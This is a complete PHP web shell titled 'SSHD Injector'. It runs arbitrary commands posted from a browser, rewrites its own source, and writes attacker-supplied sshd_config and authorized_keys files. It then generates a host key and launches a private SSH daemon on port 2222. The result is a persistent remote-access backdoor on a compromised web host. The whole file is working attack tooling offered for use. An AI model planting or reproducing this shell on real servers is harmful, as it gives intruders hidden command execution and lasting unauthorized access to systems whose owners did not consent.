<!DOCTYPE html>
<!-- Alexis Giraudet -->
<?php

if(isset($_POST["sshd"]) || isset($_POST["sshkeygen"]) || isset($_POST["workspace"]) || isset($_POST["cmdprefix"]) || isset($_POST["cmdpostfix"]))
{    
    $script_content = file_get_contents(basename(__FILE__));

    if(isset($_POST["sshd"]))
    {
        $script_content = preg_replace('#\$sshd_bin = "[^"]+";#', '$sshd_bin = "'.addslashes($_POST["sshd"]).'";', $script_content);
    }

    if(isset($_POST["sshkeygen"]))
    {
        $script_content = preg_replace('#\$ssh_keygen_bin = "[^"]+";#', '$ssh_keygen_bin = "'.addslashes($_POST["sshkeygen"]).'";', $script_content);
    }

    if(isset($_POST["workspace"]))
    {
        $script_content = preg_replace('#\$workspace = "[^"]+";#', '$workspace = "'.addslashes($_POST["workspace"]).'";', $script_content);
    }

    if(isset($_POST["cmdprefix"]))
    {
        $script_content = preg_replace('#\$cmd_prefix = "[^"]+";#', '$cmd_prefix = "'.addslashes($_POST["cmdprefix"]).'";', $script_content);
    }

    if(isset($_POST["cmdpostfix"]))
    {
        $script_content = preg_replace('#\$cmd_postfix = "[^"]+";#', '$cmd_postfix = "'.addslashes($_POST["cmdpostfix"]).'";', $script_content);
    }

    file_put_contents(basename(__FILE__), $script_content);

    header("Location:".basename(__FILE__));

    exit(0);
}

$sshd_bin = "sshd";
$ssh_keygen_bin = "ssh-keygen";
$workspace = ".";
$cmd_prefix = "LD_LIBRARY_PATH=. ";
$cmd_postfix = " 2>&1";

$workspace = realpath($workspace);
if($workspace === FALSE)
{
    $workspace = realpath(NULL);
}

$path = getenv("PATH");
if($path === FALSE)
{
    $path = $workspace;
}

$sshd_path = $workspace."/.sshd";
$sshd_authorized_keys = $sshd_path."/authorized_keys";
$sshd_config = $sshd_path."/sshd_config";
$sshd_hostkey = $sshd_path."/sshd_host_key";
$sshd_pidfile = $sshd_path."/sshd.pid";

$sshd_default_config_content =
"Port 2222
HostKey $sshd_hostkey
UsePrivilegeSeparation no
PidFile $sshd_pidfile
PasswordAuthentication no
PubkeyAuthentication yes
AuthorizedKeysFile $sshd_authorized_keys";

function prepare_dir($dir)
{
    if(@is_dir($dir))
    {
        return TRUE;
    }
    return @mkdir($dir);
}

?>
<html>
    <head>
        <meta charset="utf-8">
        <title>SSHD Injector</title>
        <style>
        p, table, th, td { border: thin solid black; width: 100%; }
        .allwidth { width: 100%; }
        </style>
    </head>
    <body>
        <p>
            <?php echo htmlentities(shell_exec("uname -a")); ?>
            <br>
            <?php echo htmlentities(shell_exec("id")); ?>
            <br>
            <?php echo htmlentities("PATH = ".$path); ?>
            <br>
            <?php echo htmlentities("command prefix = ".$cmd_prefix); ?>
            <br>
            <?php echo htmlentities("command postfix = ".$cmd_postfix); ?>
            <br>
            <?php echo htmlentities("workspace = ".$workspace); ?>
            <br>
            <?php echo htmlentities("sshd = ".$sshd_bin); ?>
            <br>
            <?php echo htmlentities("ssh-keygen = ".$ssh_keygen_bin); ?>
            <br>
        </p>
        <form method="post" action="<?php echo basename(__FILE__); ?>">
            <fieldset>
                <legend>Update script</legend>
                <label>sshd = </label><input type="text" name="sshd" value="<?php echo $sshd_bin; ?>" required>
                <br>
                <label>ssh-keygen = </label><input type="text" name="sshkeygen" value="<?php echo $ssh_keygen_bin; ?>" required>
                <br>
                <label>workspace = </label><input type="text" name="workspace" value="<?php echo $workspace; ?>" required>
                <br>
                <label>command prefix = </label><input type="text" name="cmdprefix" value="<?php echo $cmd_prefix; ?>" required>
                <br>
                <label>command postfix = </label><input type="text" name="cmdpostfix" value="<?php echo $cmd_postfix; ?>" required>
                <br>
                <input type="submit" value="Update script" class="allwidth">
            </fieldset>
        </form>
        <form method="post" action="<?php echo basename(__FILE__); ?>">
            <fieldset>
                <legend>Execute command</legend>
<?php
                if(isset($_POST["command"]))
                {
                    echo "<p>";
                    echo htmlentities("$ ".$_POST["command"])."<br>";
                    echo nl2br(htmlentities(shell_exec($_POST["command"])));
                    echo "</p>";
                }
?>
                <input type="text" name="command" value="find `echo $PATH | tr ':' ' '` -name 'sshd' 2> /dev/null" class="allwidth">
                <br>
                <input type="submit" value="Execute" class="allwidth">
            </fieldset>
        </form>
        <form method="post" action="<?php echo basename(__FILE__); ?>">
            <fieldset>
                <legend>Start Stop Clear Generate key</legend>
<?php
                if(isset($_POST["clear"]) && ($_POST["clear"] == "checked"))
                {
                    $clear_cmd = "rm -rf $sshd_path".$cmd_postfix;
                    echo "<p>";
                    echo htmlentities("$ ".$clear_cmd)."<br>";
                    echo nl2br(htmlentities(shell_exec($clear_cmd)));
                    echo "</p>";
                }
?>
                <div><input type="checkbox" name="clear" id="clear" value="checked"><label for="clear">Clear</label></div>
                <br>
<?php
                if(isset($_POST["stop"]) && ($_POST["stop"] == "checked"))
                {
                    $stop_cmd = "kill `cat $sshd_pidfile` 2>&1 ; rm $sshd_pidfile";
                    echo "<p>";
                    echo htmlentities("$ ".$stop_cmd)."<br>";
                    echo nl2br(htmlentities(shell_exec($stop_cmd)));
                    echo "</p>";
                }
?>
                <div><input type="checkbox" name="stop" id="stop" value="checked"><label for="stop">Stop</label></div>
                <br>
<?php
                if(isset($_POST["start"]) && ($_POST["start"] == "checked"))
                {
                    $start_cmd = $cmd_prefix."$sshd_bin -f $sshd_config".$cmd_postfix;
                    echo "<p>";
                    echo htmlentities("$ ".$start_cmd)."<br>";
                    echo nl2br(htmlentities(shell_exec($start_cmd)));
                    echo "</p>";
                }
?>
                <div><input type="checkbox" name="start" id="start" value="checked"><label for="start">Start</label></div>
                <br>
<?php
                if(isset($_POST["keygen"]) && ($_POST["keygen"] == "checked"))
                {
                    prepare_dir($sshd_path);
                    $keygen_cmd = $cmd_prefix."$ssh_keygen_bin -f $sshd_hostkey -N ''".$cmd_postfix;
                    echo "<p>";
                    echo htmlentities("$ ".$keygen_cmd)."<br>";
                    echo nl2br(htmlentities(shell_exec($keygen_cmd)));
                    echo "</p>";
                }
?>
                <div><input type="checkbox" name="keygen" id="keygen" value="checked"><label for="keygen">Generate key</label></div>
                <br>
                <input type="submit" value="Execute" class="allwidth">
            </fieldset>
        </form>
        <form method="post" action="<?php echo basename(__FILE__); ?>">
            <fieldset>
                <legend>Update sshd_config</legend>
<?php
                if(isset($_POST["sshd_config_content"]))
                {
                    echo "<p>";
                    if((!prepare_dir($sshd_path)) || (file_put_contents($sshd_config, $_POST["sshd_config_content"]) === FALSE))
                    {
                        echo "Error";
                    }
                    else
                    {
                        echo "sshd-config updated";
                    }
                    echo "</p>";
                }
?>
<textarea name="sshd_config_content" class="allwidth" required>
<?php
                    $sshd_config_content = @file_get_contents($sshd_config);
                    if($sshd_config_content === FALSE)
                    {
                        echo $sshd_default_config_content;
                    }
                    else
                    {
                        echo $sshd_config_content;
                    }
?>
</textarea>
                <br>
                <input type="submit" value="Update sshd_config" class="allwidth">
            </fieldset>
        </form>
        <form method="post" action="<?php echo basename(__FILE__); ?>">
            <fieldset>
                <legend>Update authorized_keys</legend>
<?php
                if(isset($_POST["authorized_keys_content"]))
                {
                    echo "<p>";
                    if((!prepare_dir($sshd_path)) || (file_put_contents($sshd_authorized_keys, $_POST["authorized_keys_content"]) === FALSE))
                    {
                        echo "Error";
                    }
                    else
                    {
                        echo "authorized-keys updated";
                    }
                    echo "</p>";
                }
?>
<textarea name="authorized_keys_content" class="allwidth" required>
<?php
                    $sshd_authorized_keys_content = @file_get_contents($sshd_authorized_keys);
                    if($sshd_authorized_keys_content === FALSE)
                    {
                        ;
                    }
                    else
                    {
                        echo $sshd_authorized_keys_content;
                    }
?>
</textarea>
                <br>
                <input type="submit" value="Update authorized_keys" class="allwidth">
            </fieldset>
        </form>
        <table>
<?php
            $sshd_path_exist = @is_dir($sshd_path);
            $sshd_authorized_keys_exist = @is_file($sshd_authorized_keys);
            $sshd_config_exist = @is_file($sshd_config);
            $sshd_hostkey_exist = @is_file($sshd_hostkey);
            $sshd_pidfile_exist = @is_file($sshd_pidfile);


            $file_exist = "present";
            $not_file_exist = "absent";
?>
            <tr>
                <td><?php echo htmlentities($sshd_path); ?></td>
                <td><?php if($sshd_path_exist){ echo $file_exist; } else{ echo $not_file_exist; } ?></td>
            </tr>
            <tr>
                <td><?php echo htmlentities($sshd_authorized_keys); ?></td>
                <td><?php if($sshd_authorized_keys_exist){ echo $file_exist; } else{ echo $not_file_exist; } ?></td>
            </tr>
            <tr>
                <td><?php echo htmlentities($sshd_config); ?></td>
                <td><?php if($sshd_config_exist){ echo $file_exist; } else{ echo $not_file_exist; } ?></td>
            </tr>
            <tr>
                <td><?php echo htmlentities($sshd_hostkey); ?></td>
                <td><?php if($sshd_hostkey_exist){ echo $file_exist; } else{ echo $not_file_exist; } ?></td>
            </tr>
            <tr>
                <td><?php echo htmlentities($sshd_pidfile); ?></td>
                <td><?php if($sshd_pidfile_exist){ echo $file_exist; } else{ echo $not_file_exist; } ?></td>
            </tr>
        </table>
    </body>
</html>
